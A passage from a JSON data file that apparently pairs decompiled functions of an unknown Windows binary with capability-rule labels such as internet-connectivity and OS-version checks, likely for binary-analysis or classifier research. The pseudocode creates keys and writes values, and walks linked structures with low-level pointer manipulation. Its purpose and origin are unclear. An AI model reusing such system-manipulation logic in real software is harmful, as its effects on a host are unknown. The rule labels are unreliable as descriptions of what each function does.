        "decompiled_code": "\nuint __cdecl fcn.00040ad0(uint arg_8h, uint arg_ch, uchar *arg_10h)\n\n{\n    uint uVar1;\n    \n    (**0xb1bde03c)(0xb1c5b4f4, arg_8h, arg_ch, 0);\n    if (*0xb1c5b4f4 == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.00078790(arg_10h, 0, 0x7c);\n        *arg_10h = 5;\n        arg_10h[1] = 1;\n        *(arg_10h + 8) = 0xb1c0dbd0;\n        *(arg_10h + 0xc) = 0;\n        *(arg_10h + 0x10) = 0;\n        *(arg_10h + 0x14) = 0xb1c0dbf0;\n        *(arg_10h + 0x1c) = 0xb1c0dc10;\n        *(arg_10h + 0x24) = 0xb1c0dc30;\n        *(arg_10h + 0x2c) = 0xb1c0dc50;\n        *(arg_10h + 0x3c) = 0xb1c0dc70;\n        *(arg_10h + 0x40) = 0xb1c0dc90;\n        *(arg_10h + 0x34) = 0xb1c0dcb0;\n        *(arg_10h + 0x44) = 0xb1c0dcd0;\n        *(arg_10h + 0x18) = 0xb1c0dcf0;\n        *(arg_10h + 0x20) = 0xb1c0dd10;\n        *(arg_10h + 0x60) = 0xb1c0dd30;\n        *(arg_10h + 100) = 0xb1c0dd50;\n        *(arg_10h + 0x68) = 0xb1c0dd70;\n        uVar1 = (**0xb1bde030)(*0xb1c5b4f4, arg_10h, 0x7c);\n    }\n    return uVar1;\n}\n",
        "token_count": 530
    },
    "00040d90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00040d90(void)\n\n{\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_4h;\n    \n    var_7ch = 0;\n    var_4h = fcn.00040f30(&var_78h, &var_7ch);\n    if (var_4h == 0) {\n        *0xb1c5b504 = fcn.00040010(var_7ch, 0x100, 0xb1c0e040);\n        *0xb1c5b508 = fcn.00040010(var_7ch, 0x100, 0xb1c0e060);\n        *0xb1c5b50c = fcn.00040010(var_7ch, 0x100, 0xb1c0e080);\n        *0xb1c5b510 = fcn.00040010(var_7ch, 0x100, 0xb1c0e0a0);\n        *0xb1c5b514 = fcn.00040010(var_7ch, 0x100, 0xb1c0e0c0);\n        *0xb1c5b518 = fcn.00040010(var_7ch, 0x100, 0xb1c0e0e0);\n        *0xb1c5b51c = fcn.00040010(var_7ch, 0x100, 0xb1c0e100);\n        *0xb1c5b520 = fcn.00040010(var_7ch, 0x100, 0xb1c0e120);\n        *0xb1c5b524 = fcn.00040010(var_7ch, 0x100, 0xb1c0e140);\n        *0xb1c5b528 = fcn.00040010(var_7ch, 0x100, 0xb1c0e160);\n        *0xb1c5b52c = fcn.00040010(var_7ch, 0x100, 0xb1c0e1c0);\n        *0xb1c5b530 = fcn.00040010(var_7ch, 0x100, 0xb1c0e180);\n        *0xb1c5b534 = fcn.00040010(var_7ch, 0x100, 0xb1c0e1a0);\n        *0xb1c5b538 = fcn.00040010(var_7ch, 0x100, 0xb1c0e1e0);\n        (**0xb1bde028)(&var_4h, var_7ch);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 628
    },
    "00041200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00041200(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    do {\n        if (arg_ch - arg_14h <= var_8h) {\n            return 0;\n        }\n        var_18h = arg_8h + var_8h;\n        cVar1 = (**0xb1bde208)(var_18h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = (**0xb1bde208)(var_18h + arg_14h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        var_14h = arg_10h;\n        for (var_10h = arg_14h; 3 < var_10h; var_10h = var_10h - 4) {\n            if (*var_18h != *var_14h) goto code_r0x000412ac;\n            var_14h = var_14h + 1;\n            var_18h = var_18h + 1;\n        }\n        if (var_10h == 0) {\ncode_r0x0004132e:\n            var_20h = 0;\n        }\n        else {\ncode_r0x000412ac:\n            var_1ch = *var_18h - *var_14h;\n            if (var_1ch == 0) {\n                if (var_10h == 1) goto code_r0x0004132e;\n                var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                if (var_1ch == 0) {\n                    if (var_10h == 2) goto code_r0x0004132e;\n                    var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                    if (var_1ch == 0) {\n                        if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                        goto code_r0x0004132e;\n                    }\n                }\n            }\n            var_20h = 1;\n            if (var_1ch < 1) {\n                var_20h = -1;\n            }\n        }\n        if (var_20h == 0) {\n            return var_8h;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 682
    },
    "00041370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00041370(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_c4h = 0;\n    var_4h = 0;\n    var_bch = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c4h = 0x21590065;\n    }\n    else {\n        *arg_10h = 0;\n        *arg_ch = 0;\n        *arg_14h = 0;\n        puVar3 = arg_8h;\n        puVar4 = &var_b8h;\n        for (iVar2 = 0x2a; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        uVar1 = *(var_a0h + 0x14);\n        var_c4h = fcn.00041dd0();\n        if (var_c4h == 0) {\n            var_c4h = fcn.00041980();\n            if ((var_c4h == 0) && (var_c4h = fcn.00041fd0(arg_8h, 0, &var_130h, &var_4h),  var_c4h == 0)) {\n                *0xb1c5b550 = fcn.00041200(var_4h, 200, &var_130h, 0x68);\n                if (*0xb1c5b550 != 0) {\n                    *0xb1c5b554 = *0xb1c5b550 + 4;\n                    *0xb1c5b558 = *0xb1c5b550 + 5;\n                    *0xb1c5b55c = *0xb1c5b550 + 8;\n                }\n                *0xb1c5b560 = fcn.00040010(var_4h, 0x100, 0xb1c0f150);\n                *0xb1c5b564 = fcn.00040010(var_4h, 0x100, 0xb1c0f170);\n                *0xb1c5b568 = fcn.00040010(var_4h, 0x100, 0xb1c0f1d0);\n                *0xb1c5b56c = fcn.00040010(var_4h, 0x100, 0xb1c0f1b0);\n                *0xb1c5b570 = fcn.00040010(var_4h, 0x100, 0xb1c0f190);\n                *0xb1c5b574 = fcn.00040010(var_4h, 0x100, 0xb1c0f350);\n                *0xb1c5b578 = fcn.00040010(var_4h, 0x100, 0xb1c0f1f0);\n                *0xb1c5b57c = fcn.00040010(var_4h, 0x100, 0xb1c0f230);\n                *0xb1c5b560 = fcn.00040010(var_4h, 0x100, 0xb1c0f150);\n                *0xb1c5b580 = fcn.00040010(var_4h, 0x100, 0xb1c0f210);\n                *0xb1c5b584 = fcn.00040010(var_4h, 0x100, 0xb1c0f2d0);\n                *0xb1c5b588 = fcn.00040010(var_4h, 0x100, 0xb1c0f2f0);\n                *0xb1c5b58c = fcn.00040010(var_4h, 0x100, 0xb1c0f2b0);\n                *0xb1c5b590 = fcn.00040010(var_4h, 0x100, 0xb1c0f310);\n                *0xb1c5b594 = fcn.00040010(var_4h, 0x100, 0xb1c0f270);\n                *0xb1c5b598 = fcn.00040010(var_4h, 0x100, 0xb1c0f290);\n                *0xb1c5b59c = fcn.00040010(var_4h, 0x100, 0xb1c0f250);\n                *0xb1c5b5a0 = fcn.00040010(var_4h, 0x100, 0xb1c0f330);\n                fcn.0001aa20(2, &var_ch, &var_c0h);\n                var_8h = 0;\n                for (var_bch = var_4h; var_bch != 0; var_bch = *(var_bch + 4)) {\n                    if (var_bch != var_4h) {\n                        var_8h = var_8h + 1;\n                    }\n                }\n                fcn.0001ab70(var_ch, var_c0h);\n                iVar2 = fcn.00035230(var_8h << 2);\n                *arg_ch = iVar2;\n                if (*arg_ch == 0) {\n                    var_c4h = -0x3fffff66;\n                }\n                else {\n                    fcn.0001aa20(2, &var_ch, &var_c0h);\n                    *arg_10h = 0;\n                    var_bch = var_4h;\n                    while ((var_bch != 0 && (*arg_10h < var_8h))) {\n                        if (var_bch != var_4h) {\n                            *(*arg_ch + *arg_10h * 4) = var_bch;\n                            *arg_10h = *arg_10h + 1;\n                            if (*arg_14h == 0) {\n                                iVar2 = fcn.000417f0(var_bch);\n                                *arg_14h = iVar2;\n                            }\n                        }\n                        var_bch = *(var_bch + 4);\n                    }\n                    fcn.0001ab70(var_ch, var_c0h);\n                }\n                (**0xb1c685c0)(var_4h);\n            }\n            *(var_a0h + 0x14) = uVar1;\n            puVar3 = &var_b8h;\n            for (iVar2 = 0x2a; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            fcn.000418d0(0xb1c58798, 0xb1c58728);\n            fcn.000418d0(0xb1c58870, 0xb1c58778);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 1738
    },
    "000417f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000417f0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *piVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = *(arg_8h + 0xc);\n    var_8h = 0;\n    if ((iVar1 == 0) || (*(iVar1 + 8) != arg_8h)) {\n        var_8h = 0;\n    }\n    else {\n        for (var_4h = 0; var_4h < 0x300; var_4h = var_4h + 4) {\n            piVar4 = iVar1 + var_4h;\n            cVar3 = (**0xb1bde208)(piVar4);\n            if ((cVar3 != '\\0') && (cVar3 = (**0xb1bde208)(*piVar4),  cVar3 != '\\0')) {\n                iVar2 = *piVar4;\n                cVar3 = (**0xb1bde208)(iVar2 + 8);\n                if ((cVar3 != '\\0') && (*(iVar2 + 8) == arg_8h)) {\n                    var_8h = var_4h;\n                    break;\n                }\n            }\n        }\n        if ((var_8h == 0) && (var_8h = 4,  *(iVar1 + 4) != 0)) {\n            var_8h = 0;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 380
    },
    "000418d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000418d0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_22ch;\n    uint var_228h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00078556(&var_228h, 0x100, 0xb1bde768, arg_8h, arg_ch);\n    fcn.00078550(&var_8h, &var_228h);\n    var_20h = 0x18;\n    var_1ch = 0;\n    var_14h = 0x40;\n    var_18h = &var_8h;\n    var_10h = 0;\n    var_ch = 0;\n    uVar1 = fcn.0007854a(&var_24h, 0xf003f, &var_20h);\n    if (uVar1 == 0) {\n        uVar1 = fcn.0007857a(var_24h);\n    }\n    else {\n        uVar1 = -(uVar1 != 0xc0000008) & uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "00041980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00041980(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_2e4h;\n    uint var_2dch;\n    uint *var_2d8h;\n    uint var_2d4h;\n    uint var_2cch;\n    uint *var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    int32_t var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_2c4h = *0xb1be2028;\n    var_2c0h = *0xb1be202c;\n    var_2bch = *0xb1be2030;\n    var_18h = *0xb1be2034;\n    var_14h = *0xb1be2038;\n    var_10h = *0xb1be203c;\n    var_ch._0_1_ = *0xb1be2040;\n    var_58h = *0xb1be2044;\n    var_54h = *0xb1be2048;\n    var_2b8h = *0xb1be204c;\n    var_2b4h = *0xb1be2050;\n    var_2b0h = *0xb1be2054;\n    var_2ach = *0xb1be2058;\n    var_2a8h = *0xb1be205c;\n    var_2a4h = *0xb1be2060;\n    puVar3 = 0xb1be2064;\n    puVar4 = &var_4ch;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_278h = *0xb1be2080;\n    var_274h = *0xb1be2084;\n    var_270h = *0xb1be2088;\n    var_26ch = *0xb1be208c;\n    var_268h = *0xb1be2090;\n    var_264h._0_2_ = *0xb1be2094;\n    var_2a0h = *0xb1be2098;\n    var_29ch = *0xb1be209c;\n    var_298h = *0xb1be20a0;\n    var_294h = *0xb1be20a4;\n    var_28ch = 1;\n    var_5ch = 2;\n    var_50h = 0;\n    var_284h = 2;\n    fcn.00078556(&var_260h, 0x100, 0xb1bde768, 0xb1c58798, 0xb1c58728);\n    fcn.00078550(&var_8h, &var_260h);\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0x40;\n    var_28h = &var_8h;\n    var_20h = 0;\n    var_1ch = 0;\n    var_290h = fcn.00078628(&var_288h, 0xf003f, &var_30h, 0, 0, 0, &var_284h);\n    if (var_290h == 0) {\n        fcn.00078556(&var_260h, 0x100, 0xb1be1ff0, 0xb1c58798, 0xb1c58728, &var_58h);\n        fcn.00078550(&var_8h, &var_260h);\n        var_30h = 0x18;\n        var_2ch = 0;\n        var_24h = 0x40;\n        var_28h = &var_8h;\n        var_20h = 0;\n        var_1ch = 0;\n        var_290h = fcn.00078628(&var_50h, 0xf003f, &var_30h, 0, 0, 0, &var_284h);\n        if (var_290h == 0) {\n            fcn.00078550(&var_280h, &var_2b8h);\n            var_2c8h = &var_2c4h;\n            do {\n                cVar1 = *var_2c8h;\n                var_2c8h = var_2c8h + 1;\n            } while (cVar1 != '\\0');\n            var_290h = fcn.0007853e(var_50h, &var_280h, 0, 1, &var_2c4h, var_2c8h + (1 - (&var_2c4h + 1)));\n            if (var_290h == 0) {\n                fcn.00078550(&var_280h, &var_2a0h);\n                var_2d8h = &var_18h;\n                do {\n                    cVar1 = *var_2d8h;\n                    var_2d8h = var_2d8h + 1;\n                } while (cVar1 != '\\0');\n                var_290h = fcn.0007853e(var_50h, &var_280h, 0, 1, &var_18h, var_2d8h + (1 - (&var_18h + 1)));\n                if (var_290h == 0) {\n                    fcn.00078550(&var_280h, &var_4ch);\n                    var_290h = fcn.0007853e(var_50h, &var_280h, 0, 4, &var_28ch, 4);\n                    if (var_290h == 0) {\n                        fcn.00078550(&var_280h, &var_278h);\n                        var_290h = fcn.0007853e(var_50h, &var_280h, 0, 4, &var_5ch, 4);\n                    }\n                }\n            }\n        }\n        if (var_290h != 0) {\n            fcn.0007857a(var_288h);\n        }\n        fcn.00078544(var_288h);\n        if (var_50h != 0) {\n            fcn.00078544(var_50h);\n        }\n    }\n    return var_290h;\n}\n",
        "token_count": 1787
    },
    "00041dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00041dd0(void)\n\n{\n    int32_t var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint *var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    \n    var_21ch = 0;\n    var_22ch = 1;\n    var_238h = 2;\n    fcn.00078556(&var_200h, 0x100, 0xb1bde768, 0xb1c58870, 0xb1c58778);\n    fcn.00078550(&var_228h, &var_200h);\n    var_218h = 0x18;\n    var_214h = 0;\n    var_20ch = 0x40;\n    var_210h = &var_228h;\n    var_208h = 0;\n    var_204h = 0;\n    var_23ch = fcn.00078628(&var_220h, 0xf003f, &var_218h, 0, 0, 0, &var_238h);\n    if (var_23ch == 0) {\n        fcn.00078556(&var_200h, 0x100, 0xb1be1ff0, 0xb1c58870, 0xb1c58778, 0xb1be20a8);\n        fcn.00078550(&var_228h, &var_200h);\n        var_218h = 0x18;\n        var_214h = 0;\n        var_20ch = 0x40;\n        var_210h = &var_228h;\n        var_208h = 0;\n        var_204h = 0;\n        var_23ch = fcn.00078628(&var_21ch, 0xf003f, &var_218h, 0, 0, 0, &var_238h);\n        if (var_23ch == 0) {\n            fcn.00078550(&var_234h, 0xb1be20c0);\n            var_23ch = fcn.0007853e(var_21ch, &var_234h, 0, 4, &var_22ch, 4);\n        }\n        if (var_23ch != 0) {\n            fcn.0007857a(var_220h);\n        }\n        fcn.00078544(var_220h);\n        if (var_21ch != 0) {\n            fcn.00078544(var_21ch);\n        }\n    }\n    return var_23ch;\n}\n",
        "token_count": 651
    },
    "00042370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00042370(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_118h;\n    uint var_114h;\n    uint var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c8h = 0x21590065;\n    }\n    else {\n        puVar2 = arg_8h;\n        puVar3 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_cch = *(var_a0h + 0x14);\n        var_c8h = fcn.00042870(arg_8h, 0, &var_118h, &var_cch);\n        if (var_c8h == 0) {\n            *0xb1c68420 = fcn.00041200(*0xb1c5b5a4, 0x148, &var_118h, 0x48);\n            if (*0xb1c68420 != 0) {\n                *0xb1c68424 = *0xb1c68420 + 4;\n                *0xb1c68428 = *0xb1c68420 + 5;\n                *0xb1c6842c = *0xb1c68420 + 8;\n            }\n            *0xb1c68430 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0f9b0);\n            *0xb1c68434 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0f9d0);\n            *0xb1c68438 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0f990);\n            *0xb1c6843c = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0f9f0);\n            *0xb1c68440 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fa10);\n            *0xb1c68444 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fb50);\n            *0xb1c68448 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fa30);\n            *0xb1c6844c = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fa50);\n            *0xb1c68450 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fa70);\n            *0xb1c68454 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fa90);\n            *0xb1c68458 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fab0);\n            *0xb1c6845c = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fad0);\n            *0xb1c68460 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0faf0);\n            *0xb1c68464 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fb10);\n            *0xb1c68468 = fcn.00040010(*0xb1c5b5a4, 0x100, 0xb1c0fb30);\n            *0xb1c6846c = fcn.00040010(*0xb1c5b5a4, 0x100, &var_cch);\n            fcn.0001aa20(2, &var_ch, &var_c0h);\n            var_8h = *0xb1c5b5a4;\n            do {\n                iVar1 = fcn.000426c0(var_8h, &var_c4h, &var_bch);\n                if ((((iVar1 == 0) && (var_c4h == 6)) && (var_bch == 0)) && (var_8h != *0xb1c5b5a4)) {\n                    fcn.0003a530(var_8h, 0);\n                }\n                var_8h = *(var_8h + 4);\n                var_4h = var_8h;\n            } while (var_8h != 0);\n            fcn.0001ab70(var_ch, var_c0h);\n        }\n        *(var_a0h + 0x14) = var_cch;\n        puVar2 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *arg_8h = *puVar2;\n            puVar2 = puVar2 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 1390
    },
    "000426c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000426c0(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint32_t *puVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = arg_8h + *0xb1c68428;\n    pcVar3 = arg_8h + *0xb1c68424;\n    puVar4 = arg_8h + *0xb1c6842c;\n    cVar1 = (**0xb1bde208)(pcVar2);\n    if ((((cVar1 != '\\0') && (cVar1 = (**0xb1bde208)(pcVar3),  cVar1 != '\\0')) && (*pcVar3 == '\\x06')) &&\n       (((*pcVar2 == '\\0' || (*pcVar2 == '\\x01')) || (*pcVar2 == '\\x02')))) {\n        if ((*puVar4 & 1) != 0) {\n            return 0xffffffff;\n        }\n        *arg_ch = *pcVar3;\n        *arg_10h = *pcVar2;\n        return 0;\n    }\n    pcVar3 = arg_8h + *0xb1c68488;\n    pcVar2 = arg_8h + *0xb1c68484;\n    cVar1 = (**0xb1bde208)(pcVar3);\n    if (((cVar1 != '\\0') && (cVar1 = (**0xb1bde208)(pcVar2),  cVar1 != '\\0')) &&\n       ((*pcVar2 == '\\x05' && (((*pcVar3 == '\\0' || (*pcVar3 == '\\x01')) || (*pcVar3 == '\\x02')))))) {\n        *arg_ch = *pcVar2;\n        *arg_10h = *pcVar3;\n        return 0;\n    }\n    cVar1 = (**0xb1bde208)(pcVar3);\n    if (((cVar1 != '\\0') && (cVar1 = (**0xb1bde208)(pcVar2),  cVar1 != '\\0')) &&\n       ((*pcVar2 == '\\x04' && (*pcVar3 == '\\0')))) {\n        *arg_ch = *pcVar2;\n        *arg_10h = 0;\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 565
    },
    "00042b70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00042b70(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_120h;\n    uint var_11ch;\n    uint var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c8h = 0x21590065;\n    }\n    else {\n        puVar2 = arg_8h;\n        puVar3 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_cch = *(var_a0h + 0x14);\n        var_c8h = fcn.00042ef0(arg_8h, 0, &var_120h, &var_cch);\n        if (var_c8h == 0) {\n            *0xb1c683c0 = fcn.00041200(*0xb1c5b5a8, 0x150, &var_120h, 0x50);\n            if (*0xb1c683c0 != 0) {\n                *0xb1c683c4 = *0xb1c683c0 + 4;\n                *0xb1c683c8 = *0xb1c683c0 + 5;\n                *0xb1c683cc = *0xb1c683c0 + 8;\n            }\n            *0xb1c683d0 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10040);\n            *0xb1c683d4 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10060);\n            *0xb1c683d8 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10020);\n            *0xb1c683dc = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10080);\n            *0xb1c683e0 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c100a0);\n            *0xb1c683e4 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c101e0);\n            *0xb1c683e8 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c100c0);\n            *0xb1c683ec = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c100e0);\n            *0xb1c683f0 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10100);\n            *0xb1c683f4 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10120);\n            *0xb1c683f8 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10140);\n            *0xb1c683fc = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10160);\n            *0xb1c68400 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10180);\n            *0xb1c68404 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c101a0);\n            *0xb1c68408 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c101c0);\n            *0xb1c68410 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10200);\n            *0xb1c68414 = fcn.00040010(*0xb1c5b5a8, 0x100, 0xb1c10220);\n            *0xb1c6840c = fcn.00040010(*0xb1c5b5a8, 0x100, &var_cch);\n            fcn.0001aa20(2, &var_ch, &var_c0h);\n            var_8h = *0xb1c5b5a8;\n            do {\n                iVar1 = fcn.000426c0(var_8h, &var_c4h, &var_bch);\n                if ((((iVar1 == 0) && (var_c4h == 6)) && (var_bch == 0x14)) && (var_8h != *0xb1c5b5a8)) {\n                    fcn.0003a530(var_8h, 0x14);\n                }\n                var_8h = *(var_8h + 4);\n                var_4h = var_8h;\n            } while (var_8h != 0);\n            fcn.0001ab70(var_ch, var_c0h);\n        }\n        *(var_a0h + 0x14) = var_cch;\n        puVar2 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 